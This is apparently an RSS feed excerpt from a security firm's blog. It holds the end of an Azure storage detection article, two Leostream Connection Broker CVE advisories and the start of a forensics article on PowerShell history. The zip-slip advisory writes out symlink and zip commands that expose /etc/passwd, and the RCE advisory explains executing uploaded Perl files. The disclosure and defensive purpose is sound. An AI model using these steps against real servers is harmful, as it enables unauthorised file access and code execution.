    &lt;a href=&#34;#ingestion-into-azure-sentinel&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Organisations for a defence in depth approach should look to be using Azure sentinel and integration to their choses SIEM vendor for a holistic view of the overall defensive stance of the shared storage services. Monitoring should always take place on key assets that contain sensitive data and content.&lt;/p&gt;
&lt;p&gt;To make detection collaboration easier, Azure sentinel can ingest Azure storage account logs, this allows for defenders to query access logs. Importantly, queries can be run based on &lt;em&gt;Authentication type&lt;/em&gt; and &lt;em&gt;Operation name&lt;/em&gt;. &lt;/p&gt;
&lt;p&gt;For instance, an event where the Authentication type was set to anonymous and the Operation name was “Listblobs” should raise concerns. Albeit if you are implementing detection controls on storage account access, this should be the final step on damage control. Prior to this, storage account contents should be vetted to ensure all content present is required to be accessed publicly and without authentication. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://lh4.googleusercontent.com/zyZ3LBGi10Zn0J3qmPPeXb7bkPNU2_B622hf8Zf9R1GcQksod0X-PEBldqtgjCnKL_fx_0tGg4WwXgjRBUZnXo-8wXtv4BLQRRdK_X5mz-RLdQY5TaW5E285jwUbgmndvfpf0NGM&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Example Defensive KQL Queries&lt;/strong&gt;  &lt;span class=&#34;absolute -mt-20&#34; id=&#34;example-defensive-kql-queries&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#example-defensive-kql-queries&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;union StorageBlobLogs | where Uri contains &#34;jestestc1&#34;&lt;/strong&gt;&lt;strong&gt;| where OperationName == &#34;ListBlobs&#34;&lt;/strong&gt;&lt;strong&gt;| where AuthenticationType == &#34;Anonymous&#34;&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h3&gt;Additional Resources&lt;span class=&#34;absolute -mt-20&#34; id=&#34;additional-resources&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#additional-resources&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;It is important to make sure that when SAS tokens are assigned and created that the appropriate secure metrics are followed, ensuring the principle of least privilege is adhered to. &lt;/p&gt;
&lt;p&gt;You can find more comprehensive guidance here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/storage/common/storage-account-overview&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/azure/storage/common/storage-account-overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/rest/api/storageservices/delegate-access-with-shared-access-signature&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.microsoft.com/en-us/rest/api/storageservices/delegate-access-with-shared-access-signature&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://notsosecure.com/identifying-exploiting-leaked-azure-storage-keys/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://notsosecure.com/identifying-exploiting-leaked-azure-storage-keys/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41550 Leostream Connection Broker - Authenticated Remote Code Execution</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41550&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41550&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: Remote, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As the Leostream Connection Broker version: 9.0.40.17 allowed an attacker to upload any content through Third Party Content functionality, it was found that the application allowed the listed filenames below the ability to execute Perl programming language by default on the web application.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions as soon as possible. Leostream&amp;rsquo;s release notes and advisories can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving remote code execution, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload Perl files to be executed server-side. The default web server configuration in use by the web application (which is accessible by downloading the archive at &amp;ldquo;Download Technical Support Package&amp;rdquo; link on the left menu bar from Leostream&amp;rsquo;s website) contained the httpd.conf, which shows that the following filenames can be executed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;all_back.pl&lt;/li&gt;
&lt;li&gt;clients.pl&lt;/li&gt;
&lt;li&gt;config.pl&lt;/li&gt;
&lt;li&gt;database_error.pl&lt;/li&gt;
&lt;li&gt;error_document.pl&lt;/li&gt;
&lt;li&gt;fastlist.pl&lt;/li&gt;
&lt;li&gt;index.pl&lt;/li&gt;
&lt;li&gt;invite.pl&lt;/li&gt;
&lt;li&gt;license.pl&lt;/li&gt;
&lt;li&gt;logout.pl&lt;/li&gt;
&lt;li&gt;pcoip_broker.pl&lt;/li&gt;
&lt;li&gt;plan.pl&lt;/li&gt;
&lt;li&gt;rest.pl&lt;/li&gt;
&lt;li&gt;rpc.pl&lt;/li&gt;
&lt;li&gt;sam.pl&lt;/li&gt;
&lt;li&gt;saml.pl&lt;/li&gt;
&lt;li&gt;search.pl&lt;/li&gt;
&lt;li&gt;server.pl&lt;/li&gt;
&lt;li&gt;status.pl&lt;/li&gt;
&lt;li&gt;support.pl&lt;/li&gt;
&lt;li&gt;syslog_server.pl&lt;/li&gt;
&lt;li&gt;user.pl&lt;/li&gt;
&lt;li&gt;view.pl&lt;/li&gt;
&lt;li&gt;webquery.pl&lt;/li&gt;
&lt;li&gt;Welcome.pl&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The malicious file will be made available under the /tpc/ directory on the web server. The attacker can then trigger the malicious code execution by visiting the uploaded files.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory CVE-2021-41551 Leostream Connection Broker - Authenticated Zip Slip</title>
      <link>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</link>
      <pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Leostream Connection Broker&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: 9.0.40.17&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://leostream.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://leostream.com/&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2021-41551&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2021-41551&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 25/01/2022&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: path traversal, authenticated&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Leostream Connection Broker 9.0.40.17 allows administrators to conduct directory traversal attacks by uploading a ZIP file that contains a symbolic link.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions to this new version as soon as possible. Leostream&amp;rsquo;s advice and release notes can be found &lt;a href=&#34;https://leostream.com/wp-content/uploads/2018/11/Leostream_release_notes.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For achieving local file inclusion, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload zip files to be extracted in the web server directory. The attackers uploaded zip file should be created with a symbolic link by executing “ln -s /etc/passwd passwd”, which can then be zipped using “zip &amp;ndash;symlink -r upload.zip passwd” to create the archive. After supplying the zip file to the application, the archive will be extracted and the target file (in this case /etc/passwd) will be accessible in the /tpc/ directory of the web server, in this example /tpc/passwd.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;10/09/2021: Issue reported to the vendor&lt;br&gt;
10/09/2021: Vendor acknowledged the issues&lt;br&gt;
22/09/2021: CVE number assigned from MITRE&lt;br&gt;
16/10/2021: The security patch was released by Leostream&lt;br&gt;
25/01/2021: Advisory published by JUMPSEC&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>No Logs? No Problem! Incident Response without Windows Event Logs</title>
      <link>//localhost:1313/articles/2021/11/2021-11-22-no-logs-no-problem-incident-response-without-windows-event-logs/</link>
      <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/11/2021-11-22-no-logs-no-problem-incident-response-without-windows-event-logs/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;By Dray Agha&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Jumpsec_icons_Incident-Response.png&#34; alt=&#34;Jumpsec icons Incident Response&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In this article, we discuss some Digital Forensics and Incident Response (DFIR) techniques you can leverage when you encounter an environment &lt;strong&gt;without Windows event logs&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Where are the logs?&lt;/h1&gt;&lt;p&gt;At JUMPSEC, we regularly respond to security &lt;strong&gt;incidents with ineffective logging&lt;/strong&gt; and auditing for the purposes of a cyber incident. In some cases, organisations we encounter don’t have any recognisable SIEM or centralised log repository. In others, organisations with otherwise sufficient logging have seen &lt;strong&gt;adversaries intentionally manipulate the logs on an endpoint to prevent analysis&lt;/strong&gt; - sometimes even wiping them entirely. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Clearing the event logs on a Windows machine &lt;a href=&#34;https://www.youtube.com/watch?v=00EwvDKaKyQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;is trivial&lt;/a&gt;. It is a recognised behaviour of adversaries [&lt;a href=&#34;https://attack.mitre.org/techniques/T1070/001/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;T1070.001&lt;/a&gt;] who wish to evade and frustrate investigators’ efforts to unravel the TTPs of a malicious campaign. Without the event logs on a machine, you cannot use beautiful tools &lt;a href=&#34;https://github.com/countercept/chainsaw&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;like Chainsaw&lt;/a&gt; to easily piece together the story for your client. &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Thankfully, our guidance is relevant to all situations where logs are unavailable to support an investigation. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/bat.png&#34; alt=&#34;bat&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Log-less investigations&lt;/h1&gt;&lt;p&gt;For the rest of this article, I would like us to &lt;strong&gt;operate under a log-free paradigm - where the event logs cannot be utilised in an investigation&lt;/strong&gt;. I’d like us to discuss &lt;strong&gt;three&lt;/strong&gt; DFIR techniques that you can easily deploy when next conducting analysis on a machine that an adversary has tampered with. The machine may or may not have the required logs, or you may not trust the evidence - meaning we must verify past events through other means.  &lt;/p&gt;
&lt;p&gt;As we do not have the permanency that event logs offer, we are left with volatile forensic data. Simply put, &lt;strong&gt;if you do not get to most forensic data as quickly as possible then it may be gone forever&lt;/strong&gt;. If the machine is rebooted, the data can be lost; if the machine is left on and is used, many pieces of forensic evidence may be overwritten and lost forever.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/comprehensive-guide-on-ftk-imager/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Taking a forensic image&lt;/a&gt; is out of scope for this article, however it may be advisable to do it as quickly as possible to ensure you can access the volatile, capricious data consistently throughout an investigation. &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;There are many techniques for digital forensics. To understand and deploy the more advanced tools, there are many wise sages who I would recommend, such as &lt;a href=&#34;https://www.youtube.com/channel/UCy8ntxFEudOCRZYT1f7ya9Q&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Richard Davis’ 13Cubed&lt;/a&gt;. In particular, there are three (or &lt;strong&gt;four, if you’re feeling brave&lt;/strong&gt;) post-log techniques I consider to have a &lt;strong&gt;low barrier&lt;/strong&gt; to entry in terms of technical capability, have general &lt;strong&gt;resiliency&lt;/strong&gt; to adversarial manipulation, and are &lt;strong&gt;relevant&lt;/strong&gt; to Windows endpoints and servers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#PSReadLine&#34; &gt;&lt;strong&gt;PSReadLine&lt;/strong&gt;&lt;/a&gt; (PowerShell History)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#prefetch&#34; &gt;&lt;strong&gt;Prefetch&lt;/strong&gt;&lt;/a&gt; (PEcmd)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#shimcache&#34; &gt;&lt;strong&gt;Shimcache&lt;/strong&gt;&lt;/a&gt; (AppCompatcache)&lt;/li&gt;
&lt;li&gt;BONUS: &lt;a href=&#34;#usn-journal&#34; &gt;&lt;strong&gt;USN Journal&lt;/strong&gt;&lt;/a&gt; (via Velociraptor)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;PSReadLine&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;This first one is a technique I do not see discussed that much&lt;/strong&gt;. And I’m not sure why. It has definitely illuminated parts of an attack that were once a mystery to me in the early stages of an investigation. The only detailed post I can find is &lt;a href=&#34;https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a blog by Sophos&lt;/a&gt;, but I find it lacks some of the operational guidance that an investigator needs. &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-7.2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PsReadLine is a PowerShell module&lt;/a&gt; that can do lots of cool things. Most pertinent for our conversation is its ability to &lt;strong&gt;offer insight into the history of the PowerShell&lt;/strong&gt; commands previously run.&lt;/p&gt;
&lt;p&gt;If we run some commands, we can instantly recall them via &lt;code&gt;history&lt;/code&gt; (this isn’t the DFIR part, I promise).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/unnamed-file-1024x330.png&#34; alt=&#34;unnamed file&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;However, if the machine is rebooted (&lt;code&gt;`Restart-Computer`&lt;/code&gt;), or the history cleared (&lt;code&gt;`Clear-History`&lt;/code&gt;) then that history is lost. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2.png&#34; alt=&#34;2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/3.png&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Moreover, running the &lt;code&gt;history&lt;/code&gt; command &lt;strong&gt;will only return the history of the current user and session&lt;/strong&gt; - so other users who sign into the machine and run commands will remain a mystery… &lt;em&gt;Or maybe not?&lt;/em&gt;&lt;/p&gt;
&lt;h3&gt;PSReadLine: Retrieve PowerShell History&lt;span class=&#34;absolute -mt-20&#34; id=&#34;psreadline-retrieve-powershell-history&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#psreadline-retrieve-powershell-history&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;PSReadLine will save the &lt;a href=&#34;https://social.technet.microsoft.com/Forums/en-US/7c3cd614-f793-4b99-b826-3dff917ebe88/powershell-commands-history-windows-10-1809-psreadline?forum=win10itprogeneral#:~:text=By%20default%2C%20the%20PowerShell%20in,separately%20for%20PowerShell%20and%20ISE.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;last four thousand commands&lt;/a&gt; a user has run into a particular file. &lt;strong&gt;If you query each users’ &lt;em&gt;ConsoleHost_history.txt&lt;/em&gt;, you can retrieve these commands.&lt;/strong&gt; &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;get-content&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\*\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Roaming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSReadline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConsoleHost_history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/4-edited.png&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Here, we can see the commands I ran above. These were &lt;strong&gt;previously lost&lt;/strong&gt; to us when the machine was rebooted and/or the history wiped… &lt;strong&gt;but here they are available for us&lt;/strong&gt; to piece together what the adversary did!&lt;/p&gt;
&lt;p&gt;I wouldn’t want you to have to manually do this for every user’s history - that would waste your precious time! On an endpoint, we can &lt;strong&gt;run a quick loop&lt;/strong&gt; that will print every user &lt;em&gt;ConsoleHost_history&lt;/em&gt; file:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$Users&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Gci &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\*\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Roaming&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSReadline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConsoleHost_history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FullName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$Pasts&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Past&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$Pasts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;write-host&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;`n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;----User Pwsh History Path &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Past&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;---&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ForegroundColor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Magenta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;get-content&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$Past&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/5-edited-1.png&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;From our short script, in the pink text we&amp;rsquo;ve printed the users’ Console History file. This will snitch on last four thousand commands from each &lt;strong&gt;user account&lt;/strong&gt;. We can also see that in the red arrow and box &lt;strong&gt;Frank’s account&lt;/strong&gt; is highlighted for &lt;strong&gt;deploying Mimikatz!&lt;/strong&gt; Below Frank’s commands, we can see the IEUser’s PowerShell history begins to also be printed. &lt;/p&gt;
&lt;p&gt;This was the first technique to trace the steps of the adversary. But keep in mind some caveats: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, an attacker may just delete this file as part of their clean up operation; &lt;/li&gt;
&lt;li&gt;Second, it will only record PowerShell - not cmd or wmic; &lt;/li&gt;
&lt;li&gt;Third, it will only record up to 4096 PowerShell commands; &lt;/li&gt;
